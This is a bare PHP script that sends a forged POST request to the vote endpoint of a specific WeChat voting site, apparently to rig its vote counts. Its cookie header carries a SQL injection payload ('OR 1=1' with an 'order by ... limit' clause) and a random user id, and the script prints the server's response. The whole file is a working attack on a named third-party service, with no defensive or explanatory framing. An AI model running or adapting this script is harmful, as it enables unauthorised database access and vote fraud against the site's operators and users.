<?php
 $ch = curl_init();
    curl_setopt($ch,CURLOPT_URL,'http://toupiao.wxtup.com/mobile.php?act=module&do=votes&name=multivote&weid=26&vid=13&zid=67');
    curl_setopt($ch, CURLOPT_HEADER, true);
    $num = rand(999,9999);
    $num1 = $num+1;
   curl_setopt($ch, CURLOPT_HTTPHEADER, array("X-Requested-With:XMLHttpRequest",'Cookie:userid='.rand(1,9999).' */ OR 1=1 order by `id` limit '.$num.','.$num1.'; unionid=" /*'));
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($ch, CURLOPT_POST, 1);
    $response = curl_exec($ch);
    if (curl_getinfo($ch, CURLINFO_HTTP_CODE) == '200') {
            $headerSize = curl_getinfo($ch, CURLINFO_HEADER_SIZE);
                $header = substr($response, 0, $headerSize);
                $body = substr($response, $headerSize);

    }

    print_r($header);
    print_r(json_decode($body));
?>
